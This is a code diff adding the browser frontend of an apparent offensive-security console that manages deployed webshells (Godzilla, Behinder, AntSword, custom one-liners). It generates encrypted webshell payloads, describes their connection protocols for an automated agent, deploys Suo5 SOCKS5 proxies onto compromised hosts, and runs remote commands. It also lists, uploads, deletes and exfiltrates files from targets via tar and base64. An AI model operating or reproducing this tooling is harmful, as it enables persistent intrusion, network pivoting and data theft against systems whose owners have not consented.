+const wsViews = { term: document.getElementById('wsterm'), files: document.getElementById('wsfiles'), suo5: document.getElementById('wssuo5') }
+document.querySelectorAll('.ftab[data-wstab]').forEach((b) => {
+  b.addEventListener('click', () => {
+    document.querySelectorAll('.ftab[data-wstab]').forEach((x) => x.classList.remove('active'))
+    b.classList.add('active')
+    for (const [k, el] of Object.entries(wsViews)) el.style.display = k === b.dataset.wstab ? 'flex' : 'none'
+    if (b.dataset.wstab === 'files') wsFileList(document.getElementById('wsFilePath').value)
+    else if (b.dataset.wstab === 'term') setTimeout(() => { try { wsTermFit.fit() } catch { /* 容器不可见时忽略 */ } }, 50)
+    else if (b.dataset.wstab === 'suo5') suo5Status()
+  })
+})
+// ---- Suo5 正向代理 ----
+async function suo5Status() {
+  try {
+    const r = await fetch(`${API}/api/webshells/suo5`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ action: 'status' }) }).then((x) => x.json())
+    document.getElementById('suo5Status').textContent = r.running ? `运行中 · SOCKS5 127.0.0.1:${r.port} (${r.url})` : '未启动'
+  } catch { /* 忽略 */ }
+}
+document.getElementById('btnSuo5Start').onclick = async () => {
+  if (curWsId == null) { showMsg('请先选择 WebShell'); return }
+  const w = wsItems.find((x) => x.id === curWsId)
+  // 服务端类型按 Webshell 脚本自动判断
+  const s = w ? w.script : 'php'
+  const type = (s === 'jsp' || s === 'jspx') ? 'jsp' : (s === 'aspx' || s === 'asp') ? 'aspx' : 'php'
+  const body = { action: 'start', id: curWsId, type, url: document.getElementById('suo5Url').value.trim(), port: Number(document.getElementById('suo5Port').value) || 1080, dir: document.getElementById('suo5Dir').value.trim(), name: document.getElementById('suo5Name').value.trim() || 'suo5' }
+  if (!body.url) { showMsg('目标 URL 必填'); return }
+  const btn = document.getElementById('btnSuo5Start')
+  btn.textContent = '部署中…'; btn.disabled = true
+  try {
+    const r = await fetch(`${API}/api/webshells/suo5`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) }).then((x) => x.json())
+    if (r.error) { showMsg('启动失败：' + r.error); return }
+    showMsg(`已部署服务端到 ${r.path}，本地 SOCKS5 代理已启动：127.0.0.1:${r.port}`)
+    suo5Status()
+  } catch (e) { showMsg('启动失败：' + e.message) } finally { btn.textContent = '部署并启动'; btn.disabled = false }
+}
+document.getElementById('btnSuo5Stop').onclick = async () => {
+  try {
+    await fetch(`${API}/api/webshells/suo5`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ action: 'stop' }) })
+    showMsg('已停止')
+    suo5Status()
+  } catch (e) { showMsg('停止失败：' + e.message) }
+}
+// 文件管理：执行命令获取原始输出（不渲染到终端）
+async function wsExecRaw(cmd) {
+  if (curWsId == null) return ''
+  const r = await fetch(`${API}/api/webshells/exec`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ id: curWsId, command: cmd }) }).then((x) => x.json())
+  return r.output || r.result || ''
+}
+// 用 sh -c 执行命令：适配 JSP/冰蝎 的 exec 是参数数组（Runtime.exec 不解析 shell 语法，引号/重定向/管道会被当字面参数）
+async function wsExecShell(cmd) {
+  return wsExecRaw(`sh -c ${JSON.stringify(cmd)}`)
+}
+// shell 单引号安全引用（路径）
+function shq(p) { return "'" + String(p).replace(/'/g, "'\\''") + "'" }
+// 是否支持 shell 语法（管道/重定向/引号）：仅 PHP 类 webshell（shell_exec）；JSP/ASPX 是 Runtime.exec 参数数组，不支持 shell 语法
+function wsFsIsPhp() {
+  const w = wsItems.find((x) => x.id === curWsId)
+  return !!w && w.script === 'php'
+}
+// 哥斯拉：文件操作走 payload 方法（参考原版），而非 shell 命令
+function wsFsIsGodzilla() {
+  const w = wsItems.find((x) => x.id === curWsId)
+  return !!w && w.type === 'godzilla'
+}
+// 生成 WebShell 连接协议说明（供主 Agent 顺利连接/执行）
+function wsConnInfo(w) {
+  const s = w.script || 'php'
+  const c = (w.cryption || '').toUpperCase()
+  const t = w.type || ''
+  if (t === 'godzilla') {
+    if (s === 'php') return `连接协议：哥斯拉 PHP，XOR 加密（密钥=md5(用户key)前16 字节串），请求体=密钥逐字节异或后的原始字节 POST 至 ${w.url || ''}（php://input 读取），响应同样 XOR 解密；可执行任意命令/文件操作`
+    if (s === 'jsp' || s === 'jspx') return `连接协议：哥斯拉 JSP，AES-ECB（密钥=md5(用户key)前16 的16字节串），${c.includes('RAW') ? '请求体为 AES-ECB 加密原始字节（服务端按 Content-Length 读取），响应 AES 解密' : 'POST pass=base64(AES-ECB(数据)) 参数，响应为 md5(pass+key)前16+base64(AES(输出))+md5后16'}；连接密钥=${w.key ? '(需 md5(' + w.key + ') 前16)' : ''}`
+    if (s === 'aspx' || s === 'asp') return `连接协议：哥斯拉 ASPX，RijndaelManaged AES-CBC（key/IV 均为 md5(用户key)前16 字节串），请求/响应均为 AES-CBC 原始字节（BinaryRead/BinaryWrite）`
+    return `连接协议：哥斯拉（${c || '未知加密'}），脚本 ${s}`
+  }
+  if (t === 'behinder') {
+    if (s === 'php') return `连接协议：冰蝎 PHP，密钥=md5(密码)前16 字节串，POST body=base64(AES-128-ECB("func|eval代码"))，服务端 openssl 解密后 eval(params)；密码=${w.password || ''}`
+    if (s === 'jsp' || s === 'jspx') return `连接协议：冰蝎 JSP，密钥=md5(密码)前16 字节串，POST body=base64(AES-ECB(Java class))，服务端 defineClass 加载；密码=${w.password || ''}`
+    if (s === 'aspx') return `连接协议：冰蝎 ASPX，密钥=md5(密码)前16 字节串，POST 原始字节=RijndaelManaged CBC 加密的 .NET 程序集；密码=${w.password || ''}`
+    return `连接协议：冰蝎（脚本 ${s}），密钥=md5(密码)前16`
+  }
+  if (t === 'antsword') return `连接协议：蚁剑，POST ${w.url || ''}?id=1，body=shell=base64(要执行的 PHP 代码)（服务端 @eval(base64_decode($_POST["shell"]))）`
+  if (t === 'custom') return `连接协议：自定义一句话，GET ${w.url || ''}?pwd=${w.password || 'pass'}&cmd=<命令>（pwd 为访问口令，cmd 为要执行的命令）`
+  return `连接协议：类型 ${t} / 脚本 ${s} / URL ${w.url || ''}`
+}
+async function wsFileOp(action, params) {
+  const r = await fetch(`${API}/api/webshells/fileop`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ id: curWsId, action, ...params }) }).then((x) => x.json())
+  return r.output || ''
+}
+// 解析哥斯拉 getFile 输出：ok\n<path>\n<name>\t<isFile1/0>\t<time>\t<size>\t<perm>\n...
+function parseGodzillaFile(out) {
+  const items = []
+  const lines = out.split('\n')
+  for (const line of lines.slice(2)) {
+    if (!line.trim()) continue
+    const p = line.split('\t')
+    if (p.length < 5) continue
+    items.push({ isDir: p[1] === '0', name: p[0], size: p[3], mtime: p[2], perms: p[4] || '' })
+  }
+  return items
+}
+// 解析 ls -la 输出为文件条目（兼容 权限含 ACL+ / 旧文件显示年份 / 符号链接）
+function parseLsOutput(out) {
+  const items = []
+  for (const line of out.split('\n')) {
+    const m = line.match(/^([d\-lbpsc])[\-rwxStT\+]*\s+\d+\s+\S+\s+\S+\s+(\d+)\s+(\S{3}\s+\d{1,2}\s+(?:\d{1,2}:\d{2}|\d{4}))\s+(.+)$/)
+    if (!m) continue
+    const name = m[4]   // 名称（时间之后）
+    if (name === '.') continue  // 只跳过当前目录 .，保留 ..（ls 自带的上级目录项）
+    const isDir = m[1] === 'd' || m[1] === 'l'  // 符号链接也允许进入（若指向目录）
+    items.push({ isDir, name, size: m[2], mtime: m[3].replace(/\s+/g, ' '), perms: line.split(/\s+/)[0] })
+  }
+  return items
+}
+async function wsFileList(dir) {
+  const path = (dir || document.getElementById('wsFilePath').value || '/').trim()
+  if (!path) return
+  document.getElementById('wsFilePath').value = path
+  wsFileCurDir = path.endsWith('/') ? path : path + '/'
+  wsSelFiles.clear()
+  updateWsSelInfo()
+  const body = document.getElementById('wsFileBody')
+  body.innerHTML = '<tr><td colspan="6" style="color:#66788a;padding:8px">加载中…</td></tr>'
+  let items
+  const isGz = wsFsIsGodzilla()
+  if (isGz) {
+    const out = await wsFileOp('list', { dir: path })
+    items = parseGodzillaFile(out)
+  } else {
+    const out = wsFsIsPhp() ? await wsExecShell(`ls -la ${shq(path)} 2>&1`) : await wsExecRaw(`ls -la ${path}`)
+    items = parseLsOutput(out)
+    if (!items.length && !out.includes('total')) {
+      body.innerHTML = `<tr><td colspan="6" style="color:#f76b6b;padding:8px">无法列出目录：${esc(out)}</td></tr>`
+      return
+    }
+  }
+  body.innerHTML = ''
+  const cur = path.endsWith('/') ? path : path + '/'
+  // 哥斯拉 getFile 不含 .. → 顶部加自定义 .. 行返回上级
+  if (isGz && path !== '/') {
+    const upPath = (path.endsWith('/') ? path.slice(0, -1) : path)
+    const idx = upPath.lastIndexOf('/')
+    const parent = idx > 0 ? upPath.slice(0, idx) : '/'
+    const tr = document.createElement('tr')
+    tr.style.cssText = 'border-bottom:1px solid #222a33;cursor:pointer'
+    tr.innerHTML = `<td style="padding:4px 6px"></td><td style="padding:4px 10px"><span style="color:#4fc3f7">📁 ..</span></td><td style="padding:4px 10px;color:#66788a"></td><td style="padding:4px 10px;color:#66788a"></td><td style="padding:4px 10px;color:#66788a">上级目录</td><td style="padding:4px 10px"></td>`
+    tr.addEventListener('click', () => { document.getElementById('wsFilePath').value = parent; wsFileList(parent) })
+    body.appendChild(tr)
+  }
+  for (const it of items) {
+    const tr = document.createElement('tr')
+    tr.style.cssText = 'border-bottom:1px solid #222a33;cursor:pointer'
+    const full = cur + it.name
+    const isUp = it.name === '..'
+    tr.innerHTML = `<td style="padding:4px 6px">${isUp ? '' : `<input type="checkbox" data-check="${esc(full)}" style="vertical-align:middle">`}</td><td style="padding:4px 10px"><span style="color:${it.isDir ? '#4fc3f7' : '#d7dde4'}">${it.isDir ? '📁 ' : '📄 '}${esc(it.name)}</span></td><td style="padding:4px 10px;color:#8b98a8;font-family:'Cascadia Code',Consolas,monospace">${esc(it.perms || '')}</td><td style="padding:4px 10px;color:#8b98a8">${it.isDir ? '-' : esc(it.size)}</td><td style="padding:4px 10px;color:#8b98a8">${esc(it.mtime)}</td><td style="padding:4px 10px"><button data-del="${esc(full)}" style="background:none;border:none;color:#f76b6b;cursor:pointer;font-size:12px">删除</button></td>`
+    const cb = tr.querySelector('[data-check]')
+    if (cb) cb.onclick = (e) => { e.stopPropagation() }
+    tr.addEventListener('click', (e) => {
+      if (e.target.dataset.del) return
+      if (it.isDir) {
+        if (isUp) {
+          // 返回上级：计算规范化上级路径（路径栏不显示 /../xx/.. 这种含 .. 的拼接）
+          const p = (cur.endsWith('/') ? cur.slice(0, -1) : cur)
+          const idx = p.lastIndexOf('/')
+          const parent = idx > 0 ? p.slice(0, idx) : '/'
+          document.getElementById('wsFilePath').value = parent
+          wsFileList(parent)
+        } else {
+          document.getElementById('wsFilePath').value = full
+          wsFileList(full)
+        }
+      }
+    })
+    const del = tr.querySelector('[data-del]')
+    del.onclick = async (e) => {
+      e.stopPropagation()
+      if (!confirm(`确认删除 ${full}？`)) return
+      if (wsFsIsGodzilla()) {
+        const r = await wsFileOp('delete', { file: full })
+        showMsg(r.trim() === 'ok' ? '已删除' : '删除失败：\n' + r.slice(0, 200))
+      } else {
+        const r = wsFsIsPhp() ? await wsExecShell(`rm -rf ${shq(full)} 2>&1 && echo OK`) : await wsExecRaw(`rm -rf ${full}`)
+        showMsg(r.includes('OK') || r.trim() === '' ? '已删除' : '删除失败：\n' + r.slice(0, 200))
+      }
+      wsFileList(cur)
+    }
+    body.appendChild(tr)
+  }
+  // 全选后同步勾选
+  document.getElementById('wsFileSelAll').checked = wsSelFiles.size > 0 && wsSelFiles.size === items.filter((i) => i.name !== '..').length
+}
+document.getElementById('btnWsFileOpen').onclick = () => wsFileList(document.getElementById('wsFilePath').value)
+document.getElementById('wsFilePath').addEventListener('keydown', (e) => { if (e.key === 'Enter') wsFileList(document.getElementById('wsFilePath').value) })
+// ---- 文件管理：勾选 + 上传 / 下载 / ZIP ----
+let wsSelFiles = new Set()   // 选中的完整路径
+let wsFileCurDir = '/'       // 当前浏览目录
+function updateWsSelInfo() { document.getElementById('wsFileSelInfo').textContent = wsSelFiles.size ? `已选 ${wsSelFiles.size} 个文件（${[...wsSelFiles].slice(0, 3).map((p) => p.split('/').pop()).join(', ')}…）` : '勾选文件后可逐个下载或 ZIP 压缩' }
+// 复选框变化（事件委托）
+document.getElementById('wsFileBody').addEventListener('change', (e) => {
+  const cb = e.target.closest('[data-check]')
+  if (!cb) return
+  if (cb.checked) wsSelFiles.add(cb.dataset.check)
+  else wsSelFiles.delete(cb.dataset.check)
+  updateWsSelInfo()
+})
+// 全选
+document.getElementById('wsFileSelAll').addEventListener('change', (e) => {
+  const checked = e.target.checked
+  document.querySelectorAll('#wsFileBody [data-check]').forEach((cb) => { cb.checked = checked; if (checked) wsSelFiles.add(cb.dataset.check); else wsSelFiles.delete(cb.dataset.check) })
+  updateWsSelInfo()
+})
+// 触发前端下载（base64 → Blob）
+function wsFileSaveBlob(b64, name) {
+  try {
+    const bin = atob(b64.replace(/\s+/g, ''))
+    const bytes = new Uint8Array(bin.length)
+    for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i)
+    const a = document.createElement('a')
+    a.href = URL.createObjectURL(new Blob([bytes], { type: 'application/octet-stream' }))
+    a.download = name
+    document.body.appendChild(a); a.click(); a.remove()
+    setTimeout(() => URL.revokeObjectURL(a.href), 3000)
+  } catch (err) { throw new Error('base64 解码失败：' + err.message) }
+}
+async function wsFileDownload(p) {
+  const name = p.split('/').pop() || 'file'
+  if (wsFsIsGodzilla()) {
+    // 哥斯拉：readFileContent 返回 base64（后端已转）
+    const out = await wsFileOp('read', { file: p })
+    const t = (out || '').trim()
+    if (!t || t.startsWith('File Not Found') || t.includes('No Permission')) { showMsg(`下载失败：\n${t.slice(0, 200) || '文件不存在'}`); return }
+    try { wsFileSaveBlob(t, name) } catch (e) { showMsg('下载失败：' + e.message) }
+    return
+  }
+  const out = await wsExecShell(`base64 -w0 ${shq(p)} 2>&1`)
+  const t = out.trim()
+  if (!t || t.startsWith('base64:') || t.includes('No such file') || t.includes('denied')) { showMsg(`下载失败：\n${t.slice(0, 200) || '文件不存在'}`); return }
+  try { wsFileSaveBlob(t, name) } catch (e) { showMsg('下载失败：' + e.message) }
+}
+// 下载：逐个下载勾选文件
+document.getElementById('btnWsDownload').onclick = async () => {
+  if (!wsSelFiles.size) { showMsg('请先勾选文件'); return }
+  for (const p of wsSelFiles) { try { await wsFileDownload(p) } catch { /* 单个失败继续 */ } }
+}
+// ZIP：勾选文件压缩并下载（PHP 用 tar；JSP/哥斯拉 无 zip payload，提示）
+document.getElementById('btnWsZip').onclick = async () => {
+  if (!wsSelFiles.size) { showMsg('请先勾选文件'); return }
+  if (wsFsIsGodzilla()) { showMsg('哥斯拉（JSP/ASPX）无 ZIP payload，暂不支持；PHP 可勾选后下载或上传到本地压缩'); return }
+  if (!wsFsIsPhp()) { showMsg('当前 webshell 类型不支持 shell 压缩'); return }
+  const fn = 'hermes_' + Date.now() + '.tar.gz'
+  const rels = [...wsSelFiles].map((p) => p.slice(wsFileCurDir.length)).filter(Boolean)
+  if (!rels.length) { showMsg('请勾选当前目录下的文件'); return }
+  const out = await wsExecShell(`cd ${shq(wsFileCurDir)} && tar czf ${shq(fn)} ${rels.map(shq).join(' ')} 2>&1 && base64 -w0 ${shq(fn)} 2>&1`)
+  const t = out.trim()
+  if (t.includes('tar:') || !t) { showMsg('压缩失败：\n' + t.slice(0, 200)); return }
+  try { wsFileSaveBlob(t, fn) } catch (e) { showMsg('压缩下载失败：' + e.message) }
+}
+// 上传：选择本地文件 → base64 写回目标目录（哥斯拉走 payload uploadFile）
+document.getElementById('btnWsUpload').onclick = () => document.getElementById('wsFilePick').click()
+document.getElementById('wsFilePick').addEventListener('change', async (e) => {
+  const files = [...(e.target.files || [])]
+  e.target.value = ''
+  if (!files.length) return
+  for (const f of files) {
+    try {
+      const b64 = await new Promise((res, rej) => { const r = new FileReader(); r.onload = () => res(String(r.result).split(',')[1]); r.onerror = rej; r.readAsDataURL(f) })
+      const target = wsFileCurDir + f.name
+      if (wsFsIsGodzilla()) {
+        const r = await wsFileOp('write', { file: target, content: b64 })
+        if (r.trim() !== 'ok') showMsg(`上传失败 ${f.name}：\n${r.slice(0, 150)}`)
+      } else {
+        const r = await wsExecShell(`echo ${b64} | base64 -d > ${shq(target)} 2>&1 && echo OK`)
+        if (!r.includes('OK')) showMsg(`上传失败 ${f.name}：\n${r.slice(0, 150)}`)
+      }
+    } catch (err) { showMsg(`上传失败 ${f.name}：` + err.message) }
+  }
+  showMsg(files.length === 1 ? `上传完成：${files[0].name}` : `上传完成 ${files.length} 个文件`)
+  wsFileList(wsFileCurDir)
+})
+// 选中 webshell 时切换到虚拟终端（默认视图）
+document.getElementById('btnWsPing').onclick = async () => {
+  if (curWsId == null) return
+  const w = wsItems.find((x) => x.id === curWsId)
+  if (!w) return
+  wsOut.innerHTML += `\n[Ping] ${esc(w.url || '')} …\n`
+  const r = await fetch(`${API}/api/webshells/ping`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ id: curWsId }) }).then((x) => x.json())
+  wsOut.innerHTML += r.alive ? '✓ alive\n' : `✗ dead${r.error ? `（${esc(r.error)}）` : ''}\n`
+  wsOut.scrollTop = wsOut.scrollHeight
+  // 刷新状态标记
+  const j = await (await fetch(`${API}/api/webshells`)).json()
+  wsItems = j.items || []
+  loadWsList()
+}
+// ---- WebShell 生成（类型决定生成逻辑：哥斯拉=Payload+加密；冰蝎=脚本；蚁剑/自定义=脚本） ----
+const wsGenModal = document.getElementById('wsGenModal')
+// 哥斯拉 payload → 支持加密（参考 getAllCryption）
+const WSGEN_PAYLOAD_CRYPTIONS = {
+  'PhpDynamicPayload': [['PHP XOR Base64', 'php_xor_base64'], ['PHP XOR Raw', 'php_xor_raw'], ['PHP EVAL XOR Base64', 'php_eval_xor_base64']],
+  'JavaDynamicPayload': [['JAVA AES Base64', 'java_aes_base64'], ['JAVA AES Raw', 'java_aes_raw'], ['JAVA AES Weblogic', 'java_aes_weblogic']],
+  'CShapDynamicPayload': [['CSHAP AES Base64', 'cshap_aes_base64'], ['CSHAP AES Raw', 'cshap_aes_raw'], ['CSHAP ASMX AES Base64', 'cshap_asmx_aes_base64'], ['CSHAP EVAL AES Base64', 'cshap_eval_aes_base64']],
+  'AspDynamicPayload': [['ASP XOR Base64', 'asp_xor_base64'], ['ASP XOR Raw', 'asp_xor_raw'], ['ASP Base64', 'asp_base64'], ['ASP Raw', 'asp_raw'], ['ASP EVAL Base64', 'asp_eval_base64']],
+}
+// 冰蝎加密（传输协议）：XOR 仅 PHP 支持（后端只有 shell_xor.php）
+const WSGEN_BEHINDER_CRYPTIONS = [
+  ['默认 AES', 'aes'], ['PHP XOR', 'php_xor'],
+]
+function updateBehinderCryption() {
+  const script = document.getElementById('wsGenScript').value
+  const crySel = document.getElementById('wsGenCryption')
+  crySel.innerHTML = ''
+  const opts = script === 'php'
+    ? [['默认 AES', 'aes'], ['PHP XOR', 'php_xor']]
+    : [['默认 AES', 'aes']]
+  for (const [name, val] of opts) crySel.appendChild(new Option(name, val))
+}
+function applyWsGenType() {
+  const type = document.getElementById('wsGenType').value
+  const pRow = document.getElementById('wsGenPayloadRow')
+  const sRow = document.getElementById('wsGenScriptRow')
+  const cRow = document.getElementById('wsGenCryptionRow')
+  const kRow = document.getElementById('wsGenKeyRow')
+  // 哥斯拉：显示 Payload + 加密 + 密钥（脚本由 payload 决定）
+  // 冰蝎/蚁剑/自定义：显示脚本（+加密），密钥仅哥斯拉需要（冰蝎密钥=md5(密码)前16 由后端自动计算）
+  pRow.style.display = type === 'godzilla' ? 'flex' : 'none'
+  sRow.style.display = type === 'godzilla' ? 'none' : 'flex'
+  kRow.style.display = type === 'godzilla' ? 'flex' : 'none'
+  // 加密：哥斯拉=payload联动；冰蝎=按脚本（AES / PHP XOR）；蚁剑/自定义=隐藏
+  cRow.style.display = (type === 'godzilla' || type === 'behinder') ? 'flex' : 'none'
+  const crySel = document.getElementById('wsGenCryption')
+  if (type === 'godzilla') {
+    applyWsGenPayload()
+  } else if (type === 'behinder') {
+    updateBehinderCryption()
+  }
+}
+document.getElementById('wsGenScript').addEventListener('change', () => {
+  if (document.getElementById('wsGenType').value === 'behinder') updateBehinderCryption()
+})
+function applyWsGenPayload() {
+  const payload = document.getElementById('wsGenPayload').value
+  const cryptions = WSGEN_PAYLOAD_CRYPTIONS[payload] || []
+  const sel = document.getElementById('wsGenCryption')
+  sel.innerHTML = ''
+  for (const [name, val] of cryptions) sel.appendChild(new Option(name, val))
+}
+document.getElementById('wsGenPayload').addEventListener('change', applyWsGenPayload)
+document.getElementById('wsGenType').addEventListener('change', applyWsGenType)
+document.getElementById('btnWsGen').onclick = () => { applyWsGenType(); wsGenModal.style.display = 'flex' }
+// 存活校验：测试所有 WebShell 连接（逐个走原版哥斯拉 test 协议 / 其他类型 echo 校验）
+document.getElementById('btnWsAlive').onclick = async () => {
+  const btn = document.getElementById('btnWsAlive')
+  const old = btn.textContent
+  btn.textContent = '测试中…'
+  btn.disabled = true
+  try {
+    const r = await fetch(`${API}/api/webshells/alive_all`, { method: 'POST' }).then((x) => x.json())
+    const results = r.results || []
+    if (!results.length) { showToast('无WebShell，无法触发存活探测'); return }
+    // 探测完成：toast 提示
+    showToast('存活探测已完成，在线状态已更新')
+    loadWsList()
+  } catch (e) { showToast('存活探测失败：' + e.message) } finally { btn.textContent = old; btn.disabled = false }
+}
+document.getElementById('btnWsGenClose').onclick = () => { wsGenModal.style.display = 'none' }
+document.getElementById('btnWsGenRun').onclick = async () => {
+  const type = document.getElementById('wsGenType').value
+  const body = {
+    type,
+    payload: document.getElementById('wsGenPayload').value,
+    script: document.getElementById('wsGenScript').value,
+    cryption: document.getElementById('wsGenCryption').value,
+    password: document.getElementById('wsGenPass').value.trim(),
+    key: document.getElementById('wsGenKey').value.trim(),
+  }
+  const out = document.getElementById('wsGenOut')
+  const note = document.getElementById('wsGenNote')
+  if (!body.password) { showMsg('密码必填'); return }
+  try {
+    const r = await fetch(`${API}/api/webshells/generate`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) }).then((x) => x.json())
+    if (r.error) { out.value = r.error; note.textContent = '生成失败'; return }
+    out.value = r.code
+    note.textContent = r.note || ''
+    out.dataset.code = r.code
+  } catch (e) { out.value = '生成失败: ' + e.message; note.textContent = '' }
+}
+document.getElementById('btnWsGenCopy').onclick = async () => {
+  const out = document.getElementById('wsGenOut')
+  const code = out.dataset.code || out.value
+  if (!code) return
+  try {
+    await navigator.clipboard.writeText(code)
+    document.getElementById('wsGenNote').textContent = '已复制'
+  } catch {
+    const ta = document.createElement('textarea')
+    ta.value = code
+    document.body.appendChild(ta)
+    ta.select()
+    document.execCommand('copy')
+    ta.remove()
+    document.getElementById('wsGenNote').textContent = '已复制'
+  }
+}
 // ---- 流量（Burp 风格 11 列表头，固定列宽 + 可拖拽） ----
 const flowsBody = document.getElementById('flowsBody')
 function parseUrl(u) {
@@ -1788,7 +2635,7 @@ document.getElementById('btnSsh').onclick = () => {
     username: document.getElementById('sshUser').value,
     password: document.getElementById('sshPass').value,
   }
-  if (!opts.host || !opts.username) { alert('填 host/user'); return }
+  if (!opts.host || !opts.username) { showMsg('填 host/user'); return }
   ws = new WebSocket(WS)
   ws.onopen = () => ws.send(JSON.stringify({ type: 'connect', opts }))
   ws.onmessage = (e) => {
